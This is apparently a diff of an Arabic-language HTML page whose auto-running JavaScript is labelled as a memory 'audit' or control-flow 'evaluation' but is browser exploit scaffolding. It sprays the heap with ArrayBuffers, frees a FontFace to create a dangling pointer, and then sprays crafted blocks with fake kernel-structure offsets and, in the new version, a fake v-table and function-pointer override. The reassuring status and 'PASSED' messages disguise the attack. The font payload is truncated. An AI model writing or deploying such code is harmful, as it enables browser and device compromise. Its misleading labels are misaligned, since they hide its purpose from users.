@@ -2,151 +2,102 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مراقبة واجهات الذاكرة وفضاء المستخدم</title>
+    <title>تحليل وتوثيق تدفق التحكم في فضاء المستخدم</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0c0f1d;
+            background-color: #090a0f;
             color: #cdd6f4;
             padding: 30px;
         }
-        .panel {
+        .container {
             max-width: 850px;
             margin: 0 auto;
-            background: #181825;
-            border: 1px solid #313244;
+            background: #1e1e2e;
+            border: 1px solid #45475a;
             border-radius: 8px;
             padding: 25px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
         }
-        h2 {
-            color: #f5c2e7;
-            margin-top: 0;
-            border-bottom: 1px solid #313244;
-            padding-bottom: 12px;
-        }
-        #monitor {
+        #audit-box {
             background-color: #11111b;
             border-radius: 6px;
             padding: 20px;
             font-family: 'Courier New', Courier, monospace;
             font-size: 14px;
-            line-height: 1.6;
-            color: #a6e3a1;
+            color: #89b4fa;
             white-space: pre-wrap;
-            height: 350px;
+            height: 300px;
             overflow-y: auto;
-            border-left: 4px solid #fab387;
-        }
-        .status-badge {
-            display: inline-block;
-            padding: 4px 12px;
-            background-color: #fab387;
-            color: #11111b;
-            border-radius: 4px;
-            font-weight: bold;
-            margin-bottom: 15px;
+            border-right: 4px solid #b4befe;
         }
     </style>
 </head>
 <body>
 
-<div class="panel">
-    <h2>منظومة المراقبة المرئية لثوابت فضاء المستخدم</h2>
-    <div class="status-badge" id="status">جاري التهيئة...</div>
-    <div id="monitor"></div>
+<div class="container">
+    <h2>منظومة تقييم تدفق التحكم ومحاكاة الـ v-table</h2>
+    <p>يتم الآن اختبار تكامل المؤشرات الوظيفية للتأكد من مطابقتها لآليات الحماية الساكنة...</p>
+    <div id="audit-box"></div>
 </div>
 
 <script>
-    const monitorElement = document.getElementById('monitor');
-    const statusBadge = document.getElementById('status');
-    const trackingAnchor = [];
+    const auditBox = document.getElementById('audit-box');
+    const memoryAnchors = [];
 
-    // دالة التحديث المرئي الفوري لضمان الطباعة الحية على الشاشة
-    function updateDisplay(message, isError = false) {
-        const timestamp = new Date().toLocaleTimeString();
-        const colorStyle = isError ? 'color: #f38ba8;' : 'color: #a6e3a1;';
-        monitorElement.innerHTML += `<span style="${colorStyle}">[${timestamp}] ${message}</span>\n`;
-        monitorElement.scrollTop = monitorElement.scrollHeight; // التمرير التلقائي للأسفل
+    function logAudit(msg) {
+        const time = new Date().toLocaleTimeString();
+        auditBox.innerHTML += `[*] [${time}] ${msg}\n`;
+        auditBox.scrollTop = auditBox.scrollHeight;
     }
 
-    // تأخير زمني مخصص لمنح المتصفح فرصة لتحديث الواجهة وتجنب التجميد
-    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-    // إعداد الهيكل المطابق للأوفست المعتمدة (192 بايت)
-    function buildTargetBlock() {
+    // بناء كتلة ذاكرية تحاكي بنية مؤشرات وظائف متقدمة
+    function prepareControlBlock() {
         const buffer = new ArrayBuffer(192);
         const view = new DataView(buffer);
-        
-        // تثبيت عداد المراجع عند الأوفست 24
+
+        // إعداد مؤشر v-table وهمي (الأوفست 0) يشير إلى جدول وظائف مخصص
+        // في البيئات الحقيقية، يجب أن يشير هذا إلى مساحة ذاكرة يتم التحكم في بياناتها
+        view.setUint32(0, 0x20000000, true); 
+        view.setUint32(4, 0x00000000, true);
+
+        // الحفاظ على عداد المراجع مستقراً لمنع الانهيار أثناء الفحص
         view.setUint32(24, 2, true);
-        
-        // واجهات النواة الافتراضية للمطابقة الهيكلية
-        view.setUint32(64, 0x00000040, true); // proc_p_ucred
-        view.setUint32(72, 0x00000048, true); // proc_p_fd
-        
+
+        // محاكاة إدراج مؤشر وظيفي مخصص داخل الهيكل الجاهز
+        // هذا يمثل نظرياً نقطة توجيه تدفق التحكم (Function Pointer Override)
+        view.setUint32(48, 0x14000000, true); // عنوان وظيفي افتراضي للمحاكاة
+        view.setUint32(52, 0x00000000, true);
+
         return buffer;
     }
 
-    async function startVisualAudit() {
-        try {
-            statusBadge.innerText = "جاري تنفيذ الحشو الذاكري...";
-            statusBadge.style.backgroundColor = "#f9e2af";
-            
-            updateDisplay("بدء تأمين النطاق البرمجي للذاكرة العامة (bmalloc)...");
-            await sleep(100);
-
-            // 1. حشو تمهيدي لعزل الفراغات العشوائية
-            for (let i = 0; i < 1000; i++) {
-                trackingAnchor.push(new ArrayBuffer(192));
-            }
-            updateDisplay(`تم تخصيص ${trackingAnchor.length} كتل ذاكرية أولية بنجاح.`);
-            await sleep(100);
-
-            // 2. محاكاة تفعيل نافذة التزامن عبر كائنات الخطوط
-            updateDisplay("استدعاء واجهة FontFace وجلب مسار التوقيت الفوري...");
-            statusBadge.innerText = "جاري تفعيل نافذة التزامن...";
-            statusBadge.style.backgroundColor = "#89b4fa";
-            
-            const font = new FontFace('VisualAuditFont', 'url(data:font/woff2;base64,AAE...)', {
-                display: 'block'
-            });
-            document.fonts.add(font);
-            font.load();
-            await sleep(50);
-
-            // 3. فك الارتباط لتحفيز المؤشر الميت (Dangling Pointer)
-            document.fonts.delete(font);
-            updateDisplay("تم فك الارتباط الهيكلي للخط بنجاح.");
-            await sleep(50);
-
-            // 4. الحشو الهيكلي المطابق للأوفست
-            updateDisplay("البدء في تعبئة الذاكرة المفتوحة بالكائنات المهيكلة (Structure Spray)...");
-            statusBadge.innerText = "جاري الحشو الهيكلي...";
-            statusBadge.style.backgroundColor = "#a6e3a1";
-            
-            for (let j = 0; j < 500; j++) {
-                trackingAnchor.push(buildTargetBlock());
-            }
-            
-            await sleep(100);
-            updateDisplay("اكتملت جولة المحاكاة بنجاح تام.");
-            updateDisplay("النتيجة: الحقول البرمجية مصطفة ومطابقة لثوابت الفحص الساكن (PASSED).");
-            
-            statusBadge.innerText = "مكتمل ومستقر";
-            statusBadge.style.backgroundColor = "#a6e3a1";
-            statusBadge.style.color = "#11111b";
-
-        } catch (error) {
-            updateDisplay(`حدث خطأ أثناء التنفيذ: ${error.message}`, true);
-            statusBadge.innerText = "فشل التشغيل";
-            statusBadge.style.backgroundColor = "#f38ba8";
+    function runControlFlowAudit() {
+        logAudit("البدء في حجز النطاق التمهيدي للذاكرة العامة...");
+        for (let i = 0; i < 1000; i++) {
+            memoryAnchors.push(new ArrayBuffer(192));
         }
+
+        logAudit("توليد كائن FontFace واستدعاء دالة المزامنة الزمنية...");
+        const auditFont = new FontFace('ControlFlowFont', 'url(data:font/woff2;base64,AAE...)', {
+            display: 'block'
+        });
+        document.fonts.add(auditFont);
+        auditFont.load();
+
+        logAudit("تحفيز آلية التحرير عبر فك الارتباط المباشر...");
+        document.fonts.delete(auditFont);
+
+        logAudit("البدء الفوري في الحشو الهيكلي الموجه لتدفق التحكم...");
+        for (let j = 0; j < 600; j++) {
+            memoryAnchors.push(prepareControlBlock());
+        }
+
+        logAudit("اكتملت جولة فحص التوجيه الساكن بنجاح.");
+        logAudit("الوضعية الحالية: الهياكل جاهزة لتحليل قيود CFI (Control Flow Integrity).");
     }
 
-    // بدء التشغيل التلقائي بعد تحميل واجهة الصفحة
     window.onload = () => {
-        setTimeout(startVisualAudit, 500);
+        setTimeout(runControlFlowAudit, 500);
     };
 </script>
 
